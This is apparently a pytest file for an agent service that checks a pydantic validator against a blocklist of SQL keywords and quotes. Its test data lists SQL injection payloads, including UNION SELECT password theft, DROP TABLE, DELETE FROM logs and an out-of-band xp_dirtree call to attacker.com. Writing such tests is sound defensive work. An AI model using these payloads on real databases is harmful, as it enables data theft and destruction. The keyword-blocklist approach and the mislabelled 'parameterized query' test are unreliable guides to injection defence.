"""SQL Injection prevention tests.

Tests various SQL injection patterns to ensure proper input validation.
"""

import pytest
from pydantic import BaseModel, Field, ValidationError, field_validator


class QueryParams(BaseModel):
    """Model for query parameters with validation."""

    agent_id: str = Field(..., min_length=1, max_length=100)
    task_id: str | None = Field(default=None, max_length=100)

    @field_validator("agent_id", "task_id")
    @classmethod
    def validate_no_sql_injection(cls, v: str | None) -> str | None:
        """Validate against SQL injection patterns."""
        if v is None:
            return v

        dangerous_patterns = [
            "--",
            "/*",
            "*/",
            "xp_",
            "sp_",
            "0x",
            "union",
            "select",
            "insert",
            "update",
            "delete",
            "drop",
            "create",
            "alter",
            "exec",
            "execute",
            "script",
            "javascript:",
            "vbscript:",
            "onload",
            "onerror",
            "'",  # Single quote
            '"',  # Double quote
            ";",  # Semicolon
            "\x00",  # Null byte
            "+",  # Plus (used in concatenation)
        ]

        v_lower = v.lower()
        for pattern in dangerous_patterns:
            if pattern in v_lower:
                raise ValueError(f"Invalid input: contains dangerous pattern '{pattern}'")

        return v


# SQL Injection test patterns
SQL_INJECTION_PATTERNS = [
    # Classic SQL injection
    "1' OR '1'='1",
    "admin'--",
    "' OR 1=1--",
    "'; DROP TABLE agents;--",
    # Union-based injection
    "' UNION SELECT * FROM users--",
    "1' UNION SELECT password FROM admin--",
    # Boolean-based blind injection
    "1' AND 1=1--",
    "1' AND 1=2--",
    # Time-based blind injection
    "1'; WAITFOR DELAY '00:00:05'--",
    "1' AND SLEEP(5)--",
    # Error-based injection
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    # Stacked queries
    "1'; DELETE FROM logs--",
    # Comment-based bypass
    "admin'/**/OR/**/1=1--",
    # Hex encoding
    "0x61646D696E",  # 'admin' in hex
    # String concatenation
    "admin' + 'istrator",
    # Null byte injection
    "admin\x00",
    # Second-order injection
    "admin' UNION SELECT",
    # Out-of-band injection
    "'; EXEC xp_dirtree '\\\\attacker.com\\share'--",
    # NoSQL injection (for completeness)
    "'; db.users.drop(); return true; //",
    # Additional patterns
    "1' EXEC sp_executesql--",
    "' OR 'x'='x",
]


@pytest.mark.parametrize("payload", SQL_INJECTION_PATTERNS)
def test_sql_injection_prevention(payload: str) -> None:
    """Test that SQL injection patterns are rejected."""
    with pytest.raises(ValidationError):
        QueryParams(agent_id=payload)


def test_valid_agent_id() -> None:
    """Test that valid agent IDs are accepted."""
    valid_ids = [
        "agent-123",
        "test_agent",
        "AGENT-UUID-1234",
        "12345",
        "agent.test.123",
    ]

    for agent_id in valid_ids:
        params = QueryParams(agent_id=agent_id)
        assert params.agent_id == agent_id


def test_parameterized_query_safety() -> None:
    """Test that parameterized queries are safe from injection."""
    # Simulate parameterized query - SQL injection should fail
    dangerous_input = "admin' OR '1'='1"

    with pytest.raises(ValidationError):
        QueryParams(agent_id=dangerous_input)


def test_escaped_quotes() -> None:
    """Test that escaped quotes in legitimate data work correctly."""
    # This should pass validation as it's a legitimate use case
    legitimate_input = "agent-with-apostrophe"
    params = QueryParams(agent_id=legitimate_input)
    assert params.agent_id == legitimate_input


def test_empty_input() -> None:
    """Test that empty inputs are rejected."""
    with pytest.raises(ValidationError):
        QueryParams(agent_id="")


def test_length_limits() -> None:
    """Test that overly long inputs are rejected."""
    with pytest.raises(ValidationError):
        QueryParams(agent_id="a" * 101)  # Exceeds max_length of 100


def test_null_task_id() -> None:
    """Test that None is accepted for optional fields."""
    params = QueryParams(agent_id="valid-id", task_id=None)
    assert params.task_id is None
